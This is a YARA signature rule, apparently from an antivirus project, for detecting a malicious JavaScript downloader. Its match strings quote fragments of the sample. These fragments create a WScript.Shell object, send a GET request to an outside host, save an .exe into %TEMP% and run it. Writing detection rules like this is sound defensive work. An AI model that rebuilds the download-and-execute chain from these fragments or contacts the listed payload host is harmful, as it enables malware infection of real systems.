rule sig_20160330_a2f5aa0d6e66c264ce98c67aca1a04d8 {
  meta:
    description = "datamaliciousorder - file 20160330_a2f5aa0d6e66c264ce98c67aca1a04d8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2eb69ffdfc4b31f82a23600ae5f8a27ef1132584208df750374b4a916c60bfa2"

  strings:
    $s1  = "function _UP(_M1, _V){_O = _O * 1; return _M1 - _V;};" fullword ascii
    $s2  = "var _R0 = function _R() {return WScript[_S](\"WScript\"+\".Shell\");}(), _VW = 11;" fullword ascii
    $s3  = "if (_FL[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "_FL[_KQ](\"GET\", \"http://topcarshop.ir/m1kas\", false);" fullword ascii
    $s5  = "function _X(){return _I0 + \"\";};" fullword ascii
    $s6  = "function _TJ() {return _R0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"9axzZevxiDuS.ex\" + \"e\";};" fullword ascii
    $s7  = "function _H() {return ((_X0 == true) && (_X0 == _MO)) ? 1 : _O;};" fullword ascii
    $s8  = "function _C(_SP){_R0[\"Run\"](_SP, _O, _O);};" fullword ascii
    $s9  = "function _B()" fullword ascii
    $s10 = " while (_I){" fullword ascii
    $s11 = "function _CE(_TA) {var _D = (1, 2, 3, 4, 5, _TA); return _D;};" fullword ascii
    $s12 = "function _TT(){return 22;};" fullword ascii
    $s13 = "var _IW = new this[\"Date\"]();" fullword ascii
    $s14 = "function _W(){return _S;};" fullword ascii
    $s15 = "return _UP(_RL, _Z);" fullword ascii
    $s16 = "var _X0 = false;" fullword ascii
    $s17 = "_X0 = true; " fullword ascii
    $s18 = "var _SD = false;" fullword ascii
    $s19 = "var _MO = false;" fullword ascii
    $s20 = "_MO = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}